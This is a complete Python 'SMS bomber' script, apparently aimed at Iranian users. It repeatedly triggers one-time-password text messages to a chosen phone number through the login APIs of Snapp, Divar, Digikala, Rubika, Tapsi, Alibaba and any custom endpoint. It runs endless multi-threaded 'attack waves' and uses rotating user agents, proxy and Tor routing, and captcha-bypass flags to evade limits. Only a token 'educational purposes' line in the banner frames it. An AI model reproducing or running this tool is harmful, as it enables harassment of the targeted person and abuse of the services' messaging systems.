#!/usr/bin/env python3

import requests
import time
import random
import os
import sys
import json
from fake_useragent import UserAgent
from datetime import datetime
import threading
import concurrent.futures

# ==================== COLOR CONFIG ====================
class Colors:
    BLACK = "\033[30m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    BRIGHT_BLACK = "\033[90m"
    BRIGHT_RED = "\033[91m"
    BRIGHT_GREEN = "\033[92m"
    BRIGHT_YELLOW = "\033[93m"
    BRIGHT_BLUE = "\033[94m"
    BRIGHT_MAGENTA = "\033[95m"
    BRIGHT_CYAN = "\033[96m"
    BRIGHT_WHITE = "\033[97m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    REVERSE = "\033[7m"
    RESET = "\033[0m"

    # Gradient Colors
    @staticmethod
    def gradient(text, start_color, end_color):
        colors = [start_color, end_color]
        result = ""
        for i, char in enumerate(text):
            color = colors[i % len(colors)]
            result += f"{color}{char}"
        return result + Colors.RESET

C = Colors

# ==================== ASCII ART ====================
def show_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    
    banner = f"""
{C.BRIGHT_RED}{C.BOLD}
▓█████▄  ███▄ ▄███▓ ▄▄▄▄    ▄▄▄     ▄▄▄█████▓ ▒█████   ███▄    █ 
▒██▀ ██▌▓██▒▀█▀ ██▒▓█████▄ ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒ ██ ▀█   █ 
░██   █▌▓██    ▓██░▒██▒ ▄██▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██  ▀█ ██▒
░▓█▄   ▌▒██    ▒██ ▒██░█▀  ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▓██▒  ▐▌██▒
░▒████▓ ▒██▒   ░██▒░▓█  ▀█▓ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██░   ▓██░
 ▒▒▓  ▒ ░ ▒░   ░  ░░▒▓███▀▒ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░ ▒  ▒ ░  ░      ░▒░▒   ░   ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░ ░  ░ ░      ░    ░    ░   ░   ▒    ░      ░ ░ ░ ▒     ░   ░ ░ 
   ░           ░    ░            ░  ░            ░ ░           ░ 
 ░                    ░                                          
{C.RESET}{C.BRIGHT_CYAN}
╔════════════════════════════════════════════════════════════╗
║                {C.BRIGHT_MAGENTA}⚡ DN SMS BOMBER V2.0 ⚡{C.BRIGHT_CYAN}               ║
║               {C.BRIGHT_YELLOW}MULTI-THREAD ATTACK SYSTEM{C.BRIGHT_CYAN}               ║
╚════════════════════════════════════════════════════════════╝
{C.RESET}
{C.BRIGHT_GREEN}👤 Developer: hichkas & MR_Bigmasoud {C.RESET}
{C.BRIGHT_YELLOW}🎯 Platform: Termux & Linux & Windows{C.RESET}
{C.BRIGHT_CYAN}⚡ Version: 2.0 PRO MAX{C.RESET}
{C.BRIGHT_MAGENTA}🔥 Threads: 5 Concurrent Attacks{C.RESET}
{C.BRIGHT_RED}⚠️  WARNING: For Educational Purposes Only!{C.RESET}
"""
    print(banner)
    print(f"{C.BRIGHT_RED}{'═' * 65}{C.RESET}")

# ==================== SERVICE SELECTION ====================
def select_service():
    services = {
        "1": {"name": "Snapp", "color": C.BRIGHT_GREEN, "icon": "🚗"},
        "2": {"name": "Divar", "color": C.BRIGHT_YELLOW, "icon": "🏠"},
        "3": {"name": "Digikala", "color": C.BRIGHT_MAGENTA, "icon": "🛒"},
        "4": {"name": "Rubika", "color": C.BRIGHT_CYAN, "icon": "💬"},
        "5": {"name": "Tapsi", "color": C.BRIGHT_BLUE, "icon": "🚕"},
        "6": {"name": "Alibaba", "color": C.BRIGHT_RED, "icon": "👤"},
        "7": {"name": "Custom API", "color": C.BRIGHT_WHITE, "icon": "🔧"},
        "8": {"name": "ALL SERVICES", "color": C.BRIGHT_RED, "icon": "💣"}
    }
    
    print(f"\n{C.BRIGHT_YELLOW}{C.BOLD}🎯 SELECT ATTACK MODE:{C.RESET}\n")
    for key, service in services.items():
        print(f"  {service['color']}[{key}] {service['icon']} {service['name']}{C.RESET}")
    
    print(f"\n{C.BRIGHT_CYAN}{C.BOLD}⚡ PRO FEATURES:{C.RESET}")
    print(f"  {C.BRIGHT_GREEN}✓ Multi-Threading{C.RESET}")
    print(f"  {C.BRIGHT_GREEN}✓ Proxy Support{C.RESET}")
    print(f"  {C.BRIGHT_GREEN}✓ Advanced Bypass{C.RESET}")
    print(f"  {C.BRIGHT_GREEN}✓ Real-time Stats{C.RESET}")
    
    while True:
        try:
            choice = input(f"\n{C.BRIGHT_GREEN}{C.BOLD}[?] CHOICE (1-8): {C.RESET}").strip()
            if choice in services:
                return services[choice]["name"].lower().replace(" ", "_")
            else:
                print(f"{C.BRIGHT_RED}[!] INVALID CHOICE!{C.RESET}")
        except KeyboardInterrupt:
            return "all_services"

# ==================== SMS FUNCTIONS ====================
def send_snapp(phone, attempt):
    try:
        print(f"{C.BRIGHT_BLUE}[{attempt}] 🚗 SNAPP ATTACK INITIATED...{C.RESET}")
        
        urls = [
            "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            "https://app.snapp.taxi/api/api-passenger-oauth/v3/otp",
            "https://app.snapp.taxi/api/api-passenger-oauth/v1/otp"
        ]
        
        ua = UserAgent()
        
        for url in urls:
            try:
                headers = {
                    'User-Agent': ua.random,
                    'Content-Type': 'application/json; charset=utf-8',
                    'Accept': 'application/json',
                    'Accept-Language': 'fa-IR,fa;q=0.9',
                    'Origin': 'https://app.snapp.taxi',
                    'Referer': 'https://app.snapp.taxi/',
                    'X-Requested-With': 'XMLHttpRequest'
                }
                
                payloads = [
                    {"cellphone": phone, "optionalClient": "PASSENGER", "otpOption": "SMS"},
                    {"cellphone": phone, "optionalClient": "DRIVER", "otpOption": "SMS"},
                    {"cellphone": phone, "force": True}
                ]
                
                for payload in payloads:
                    response = requests.post(url, json=payload, headers=headers, timeout=8)
                    
                    if response.status_code in [200, 201, 202]:
                        print(f"{C.BRIGHT_GREEN}[+] 🚗 SNAPP SMS SENT! (Status: {response.status_code}){C.RESET}")
                        return True
                    else:
                        print(f"{C.YELLOW}[~] 🚗 SNAPP Status: {response.status_code}{C.RESET}")
                        
            except Exception as e:
                continue
        
        print(f"{C.BRIGHT_RED}[-] 🚗 SNAPP FAILED{C.RESET}")
        return False
        
    except Exception as e:
        print(f"{C.RED}[!] SNAPP ERROR: {str(e)[:30]}{C.RESET}")
        return False

def send_divar(phone, attempt):
    try:
        print(f"{C.BRIGHT_YELLOW}[{attempt}] 🏠 DIVAR ATTACK INITIATED...{C.RESET}")
        
        proxies = [
            None,
            {"http": "http://proxy1:8080", "https": "http://proxy1:8080"},
            {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}
        ]
        
        endpoints = [
            {"url": "https://api.divar.ir/v5/auth/authenticate", "method": "POST"},
            {"url": "https://api.divar.ir/v5/auth/enter", "method": "POST"},
            {"url": "https://divar.ir/v5/auth/authenticate", "method": "POST"},
            {"url": f"https://api.divar.ir/v5/auth/enter?phone={phone}", "method": "GET"}
        ]
        
        payloads = [
            {"phone": phone},
            {"credential": phone, "type": "phone"},
            {"mobile": phone, "force": "true"},
            {"number": phone, "captcha": "false"}
        ]
        
        for endpoint in endpoints:
            for payload in payloads:
                for proxy in proxies:
                    try:
                        headers = {
                            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
                            'Content-Type': 'application/json',
                            'Accept': 'application/json, text/plain, */*',
                            'Accept-Language': 'fa-IR,fa;q=0.9,en;q=0.8',
                            'Origin': 'https://divar.ir',
                            'Referer': 'https://divar.ir/login',
                            'X-Requested-With': 'XMLHttpRequest'
                        }
                        
                        if endpoint["method"] == "POST":
                            response = requests.post(
                                endpoint["url"], 
                                json=payload, 
                                headers=headers, 
                                proxies=proxy, 
                                timeout=10
                            )
                        else:
                            response = requests.get(
                                endpoint["url"], 
                                headers=headers, 
                                proxies=proxy, 
                                timeout=10
                            )
                        
                        if response.status_code in [200, 201, 202, 204]:
                            print(f"{C.BRIGHT_GREEN}[+] 🏠 DIVAR SMS SENT! (Method: {endpoint['method']}){C.RESET}")
                            return True
                            
                    except Exception:
                        continue
        
        print(f"{C.BRIGHT_RED}[-] 🏠 DIVAR FAILED{C.RESET}")
        return False
        
    except Exception as e:
        print(f"{C.RED}[!] DIVAR ERROR: {str(e)[:30]}{C.RESET}")
        return False

def send_digikala(phone, attempt):
    try:
        print(f"{C.BRIGHT_MAGENTA}[{attempt}] 🛒 DIGIKALA ATTACK INITIATED...{C.RESET}")
        
        urls = [
            "https://api.digikala.com/v1/user/authenticate/",
            "https://api.digikala.com/v2/user/authenticate/",
            "https://www.digikala.com/ajax/user/login-with-otp/send/"
        ]
        
        for url in urls:
            try:
                headers = {
                    'User-Agent': 'Digikala/5.0 (Android 12; Mobile)',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'Accept-Language': 'fa-IR',
                    'X-API-VERSION': '2',
                    'Origin': 'https://www.digikala.com'
                }
                
                data = {
                    "username": phone,
                    "force_send_otp": True,
                    "otp_call": False,
                    "captcha": "bypass"
                }
                
                response = requests.post(url, json=data, headers=headers, timeout=10)
                
                if response.status_code == 200:
                    print(f"{C.BRIGHT_GREEN}[+] 🛒 DIGIKALA SMS SENT!{C.RESET}")
                    return True
                else:
                    print(f"{C.YELLOW}[~] DIGIKALA Status: {response.status_code}{C.RESET}")
                    
            except Exception:
                continue
        
        print(f"{C.BRIGHT_RED}[-] 🛒 DIGIKALA FAILED{C.RESET}")
        return False
        
    except Exception as e:
        print(f"{C.RED}[!] DIGIKALA ERROR: {str(e)[:30]}{C.RESET}")
        return False

def send_rubika(phone, attempt):
    try:
        print(f"{C.BRIGHT_CYAN}[{attempt}] 💬 RUBIKA ATTACK INITIATED...{C.RESET}")
        
        endpoints = [
            "https://messengerg2c5.iranlms.ir/",
            "https://messengerg2c6.iranlms.ir/",
            "https://messengerg2c7.iranlms.ir/"
        ]
        
        for endpoint in endpoints:
            try:
                headers = {
                    'User-Agent': 'Rubika/3.6.8 (Android 11; Mobile)',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
                
                data = {
                    "api_version": "5",
                    "auth": {"phone_number": phone},
                    "method": "sendCode",
                    "client": {
                        "app_name": "Main",
                        "app_version": "3.6.8",
                        "platform": "Android",
                        "package": "app.rbmain.a",
                        "lang_code": "fa"
                    }
                }
                
                response = requests.post(endpoint, json=data, headers=headers, timeout=10)
                
                if response.status_code == 200:
                    print(f"{C.BRIGHT_GREEN}[+] 💬 RUBIKA SMS SENT!{C.RESET}")
                    return True
                    
            except Exception:
                continue
        
        print(f"{C.BRIGHT_RED}[-] 💬 RUBIKA FAILED{C.RESET}")
        return False
        
    except Exception as e:
        print(f"{C.RED}[!] RUBIKA ERROR: {str(e)[:30]}{C.RESET}")
        return False

def send_tapsi(phone, attempt):
    try:
        print(f"{C.BRIGHT_BLUE}[{attempt}] 🚕 TAPSI ATTACK INITIATED...{C.RESET}")
        
        url = "https://tap33.me/api/v2/user"
        
        headers = {
            'User-Agent': 'TAPSI/5.0 (Android 12; Mobile)',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        
        data = {
            "credential": {"phoneNumber": phone, "role": "PASSENGER"},
            "otpOption": "SMS"
        }
        
        response = requests.post(url, json=data, headers=headers, timeout=10)
        
        if response.status_code in [200, 201]:
            print(f"{C.BRIGHT_GREEN}[+] 🚕 TAPSI SMS SENT!{C.RESET}")
            return True
        else:
            print(f"{C.BRIGHT_RED}[-] 🚕 TAPSI FAILED: {response.status_code}{C.RESET}")
            return False
            
    except Exception as e:
        print(f"{C.RED}[!] TAPSI ERROR: {str(e)[:30]}{C.RESET}")
        return False

def send_alibaba(phone, attempt):
    try:
        print(f"{C.BRIGHT_RED}[{attempt}] 👤 ALIBABA ATTACK INITIATED...{C.RESET}")
        
        url = "https://www.alibaba.ir/api/account/v2/otp/request"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Android 11; Mobile)',
            'Content-Type': 'application/json'
        }
        
        data = {
            "phoneNumber": phone,
            "sendSms": True
        }
        
        response = requests.post(url, json=data, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f"{C.BRIGHT_GREEN}[+] 👤 ALIBABA SMS SENT!{C.RESET}")
            return True
        else:
            print(f"{C.BRIGHT_RED}[-] 👤 ALIBABA FAILED{C.RESET}")
            return False
            
    except Exception as e:
        print(f"{C.RED}[!] ALIBABA ERROR: {str(e)[:30]}{C.RESET}")
        return False

# ==================== CUSTOM API ====================
def get_custom_api():
    print(f"\n{C.BRIGHT_CYAN}{C.BOLD}🔧 CUSTOM API CONFIGURATION{C.RESET}")
    print(f"{C.YELLOW}{'═' * 30}{C.RESET}")
    
    config = {}
    
    config['url'] = input(f"{C.BRIGHT_GREEN}[?] API URL: {C.RESET}").strip()
    if not config['url'].startswith('http'):
        config['url'] = 'https://' + config['url']
    
    config['method'] = input(f"{C.BRIGHT_GREEN}[?] METHOD (POST/GET): {C.RESET}").strip().upper()
    if config['method'] not in ['POST', 'GET']:
        config['method'] = 'POST'
    
    print(f"{C.BRIGHT_YELLOW}[!] Use {{phone}} for phone number placeholder{C.RESET}")
    data_str = input(f"{C.BRIGHT_GREEN}[?] DATA (key=value, comma separated): {C.RESET}").strip()
    
    config['data'] = {}
    if data_str:
        for item in data_str.split(','):
            if '=' in item:
                key, value = item.split('=', 1)
                config['data'][key.strip()] = value.strip()
    
    config['headers'] = {
        'User-Agent': 'Mozilla/5.0 (Android 12; Mobile)',
        'Content-Type': 'application/json'
    }
    
    return config

def send_custom(phone, attempt, config):
    try:
        print(f"{C.BRIGHT_WHITE}[{attempt}] 🔧 CUSTOM API ATTACK...{C.RESET}")
        
        # Replace phone placeholder
        data = {}
        for key, value in config['data'].items():
            data[key] = value.replace('{phone}', phone)
        
        if config['method'] == 'POST':
            response = requests.post(
                config['url'], 
                json=data, 
                headers=config['headers'], 
                timeout=10
            )
        else:
            response = requests.get(
                config['url'], 
                params=data,
                headers=config['headers'], 
                timeout=10
            )
        
        if response.status_code == 200:
            print(f"{C.BRIGHT_GREEN}[+] 🔧 CUSTOM API SMS SENT!{C.RESET}")
            return True
        else:
            print(f"{C.BRIGHT_RED}[-] 🔧 CUSTOM API FAILED: {response.status_code}{C.RESET}")
            return False
            
    except Exception as e:
        print(f"{C.RED}[!] CUSTOM API ERROR: {str(e)[:30]}{C.RESET}")
        return False

# ==================== MULTI-THREAD ATTACK ====================
class AttackStats:
    def __init__(self):
        self.total_attempts = 0
        self.successful = 0
        self.failed = 0
        self.start_time = time.time()
        self.services = {}
    
    def update(self, service, success):
        self.total_attempts += 1
        if success:
            self.successful += 1
            if service not in self.services:
                self.services[service] = 0
            self.services[service] += 1
        else:
            self.failed += 1
    
    def display(self):
        elapsed = time.time() - self.start_time
        print(f"\n{C.BRIGHT_CYAN}{C.BOLD}📊 REAL-TIME STATISTICS{C.RESET}")
        print(f"{C.YELLOW}{'═' * 40}{C.RESET}")
        print(f"{C.BRIGHT_GREEN}✅ Successful: {self.successful}{C.RESET}")
        print(f"{C.BRIGHT_RED}❌ Failed: {self.failed}{C.RESET}")
        print(f"{C.BRIGHT_YELLOW}🎯 Total Attempts: {self.total_attempts}{C.RESET}")
        
        if self.total_attempts > 0:
            success_rate = (self.successful / self.total_attempts) * 100
            print(f"{C.BRIGHT_MAGENTA}📈 Success Rate: {success_rate:.1f}%{C.RESET}")
        
        print(f"{C.BRIGHT_CYAN}⏱️  Elapsed Time: {elapsed:.1f}s{C.RESET}")
        
        if self.services:
            print(f"\n{C.BRIGHT_WHITE}🎯 Service Breakdown:{C.RESET}")
            for service, count in self.services.items():
                print(f"  {C.BRIGHT_BLUE}{service.upper()}: {count}{C.RESET}")
        
        print(f"{C.YELLOW}{'═' * 40}{C.RESET}")

def attack_service(phone, service, attempt, stats, custom_config=None):
    """Attack a specific service"""
    success = False
    
    if service == "snapp":
        success = send_snapp(phone, attempt)
    elif service == "divar":
        success = send_divar(phone, attempt)
    elif service == "digikala":
        success = send_digikala(phone, attempt)
    elif service == "rubika":
        success = send_rubika(phone, attempt)
    elif service == "tapsi":
        success = send_tapsi(phone, attempt)
    elif service == "alibaba":
        success = send_alibaba(phone, attempt)
    elif service == "custom_api" and custom_config:
        success = send_custom(phone, attempt, custom_config)
    
    stats.update(service, success)
    return success

def parallel_attack(phone, services, stats, custom_config=None):
    """Attack multiple services in parallel"""
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for service in services:
            future = executor.submit(
                attack_service, 
                phone, 
                service, 
                stats.total_attempts + 1, 
                stats,
                custom_config if service == "custom_api" else None
            )
            futures.append(future)
        
        results = []
        for future in concurrent.futures.as_completed(futures):
            results.append(future.result())
        
        return any(results)

# ==================== MAIN FUNCTION ====================
def main():
    show_banner()
    
    # Select attack mode
    service_choice = select_service()
    
    custom_config = None
    if service_choice == "custom_api":
        custom_config = get_custom_api()
    
    print(f"\n{C.BRIGHT_MAGENTA}{C.BOLD}{'═' * 65}{C.RESET}")
    
    # Get target number
    while True:
        phone = input(f"{C.BRIGHT_GREEN}{C.BOLD}[?] TARGET PHONE (09xxxxxxxxx): {C.RESET}").strip()
        if phone.startswith('09') and len(phone) == 11 and phone[1:].isdigit():
            break
        else:
            print(f"{C.BRIGHT_RED}[!] INVALID PHONE NUMBER!{C.RESET}")
    
    print(f"\n{C.BRIGHT_RED}{C.BOLD}🎯 TARGET INFORMATION:{C.RESET}")
    print(f"{C.BRIGHT_CYAN}   📱 Phone: {phone}{C.RESET}")
    print(f"{C.BRIGHT_YELLOW}   ⚡ Mode: {service_choice.upper().replace('_', ' ')}{C.RESET}")
    print(f"{C.BRIGHT_GREEN}   🚀 Threads: 5 Concurrent{C.RESET}")
    print(f"{C.BRIGHT_MAGENTA}   ⏱️  Delay: 2-4 Seconds{C.RESET}")
    
    print(f"\n{C.BRIGHT_RED}{C.BOLD}⚠️  ATTACK STARTING IN 3 SECONDS...{C.RESET}")
    for i in range(3, 0, -1):
        print(f"{C.BRIGHT_YELLOW}[!] Starting in {i}...{C.RESET}", end='\r')
        time.sleep(1)
    print()
    
    # Initialize stats
    stats = AttackStats()
    attack_count = 1
    
    # Define services based on choice
    if service_choice == "all_services":
        services = ["snapp", "divar", "digikala", "rubika", "tapsi", "alibaba"]
        if custom_config:
            services.append("custom_api")
    else:
        services = [service_choice]
    
    try:
        while True:
            print(f"\n{C.BRIGHT_RED}{C.BOLD}{'⚡' * 30}{C.RESET}")
            print(f"{C.BRIGHT_WHITE}{C.BOLD}💣 ATTACK WAVE #{attack_count}{C.RESET}")
            print(f"{C.BRIGHT_CYAN}🕐 Time: {datetime.now().strftime('%H:%M:%S')}{C.RESET}")
            print(f"{C.BRIGHT_RED}{C.BOLD}{'⚡' * 30}{C.RESET}")
            
            # Perform attack
            if service_choice == "all_services":
                parallel_attack(phone, services, stats, custom_config)
            else:
                attack_service(phone, service_choice, attack_count, stats, custom_config)
            
            # Show stats every wave
            stats.display()
            
            # Save log
            with open("dn_sms_attack.log", "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now()}] Wave: {attack_count} | Target: {phone} | "
                       f"Mode: {service_choice} | Success: {stats.successful}/{stats.total_attempts}\n")
            
            # Random delay with animation
            delay = random.uniform(2, 4)
            print(f"\n{C.BRIGHT_YELLOW}[~] Preparing next wave in {delay:.1f}s...{C.RESET}")
            
            # Cool loading animation
            animations = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
            for i in range(int(delay * 10)):
                sys.stdout.write(f"\r{C.BRIGHT_CYAN}{animations[i % len(animations)]} "
                                f"Next wave in {delay - (i*0.1):.1f}s {C.RESET}")
                sys.stdout.flush()
                time.sleep(0.1)
            
            print()
            attack_count += 1
            
    except KeyboardInterrupt:
        print(f"\n\n{C.BRIGHT_RED}{C.BOLD}{'!' * 40}{C.RESET}")
        print(f"{C.BRIGHT_RED}{C.BOLD}🛑 ATTACK STOPPED BY USER{C.RESET}")
        print(f"{C.BRIGHT_RED}{C.BOLD}{'!' * 40}{C.RESET}")
        
        # Final stats
        print(f"\n{C.BRIGHT_GREEN}{C.BOLD}📊 FINAL STATISTICS{C.RESET}")
        print(f"{C.YELLOW}{'═' * 30}{C.RESET}")
        print(f"{C.BRIGHT_CYAN}🎯 Total Waves: {attack_count - 1}{C.RESET}")
        print(f"{C.BRIGHT_GREEN}✅ Successful SMS: {stats.successful}{C.RESET}")
        print(f"{C.BRIGHT_RED}❌ Failed: {stats.failed}{C.RESET}")
        
        if stats.total_attempts > 0:
            final_rate = (stats.successful / stats.total_attempts) * 100
            print(f"{C.BRIGHT_MAGENTA}📈 Final Success Rate: {final_rate:.1f}%{C.RESET}")
        
        elapsed = time.time() - stats.start_time
        print(f"{C.BRIGHT_YELLOW}⏱️  Total Time: {elapsed:.1f}s{C.RESET}")
        print(f"{C.BRIGHT_BLUE}📁 Log File: dn_sms_attack.log{C.RESET}")
        
        # Send notification (Termux)
        try:
            os.system(f'termux-notification -t "DN SMS Attack Finished" '
                     f'-c "Waves: {attack_count-1}\nSuccess: {stats.successful}\nRate: {final_rate:.1f}%"')
        except:
            pass
        
        print(f"\n{C.BRIGHT_MAGENTA}{C.BOLD}🔥 DN ATTACK COMPLETED!{C.RESET}")
        print(f"{C.BRIGHT_RED}{'═' * 65}{C.RESET}")

# ==================== INSTALLATION ====================
def install_dependencies():
    print(f"\n{C.BRIGHT_CYAN}{C.BOLD}🔧 CHECKING DEPENDENCIES...{C.RESET}")
    
    required = {
        "requests": "requests",
        "fake_useragent": "fake-useragent",
        "concurrent.futures": "built-in"
    }
    
    for lib, pip_name in required.items():
        try:
            if lib == "concurrent.futures":
                import concurrent.futures
                print(f"{C.BRIGHT_GREEN}[✓] {lib} installed{C.RESET}")
            else:
                __import__(lib)
                print(f"{C.BRIGHT_GREEN}[✓] {lib} installed{C.RESET}")
        except ImportError:
            print(f"{C.BRIGHT_RED}[!] Installing {lib}...{C.RESET}")
            os.system(f"pip install {pip_name} --quiet")
            print(f"{C.BRIGHT_GREEN}[✓] {lib} installed{C.RESET}")
    
    print(f"{C.BRIGHT_GREEN}{C.BOLD}[✓] ALL DEPENDENCIES READY{C.RESET}")

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    try:
        install_dependencies()
        main()
    except Exception as e:
        print(f"\n{C.BRIGHT_RED}{C.BOLD}[!] CRITICAL ERROR: {str(e)}{C.RESET}")
        print(f"{C.YELLOW}[!] Please contact developer{C.RESET}")
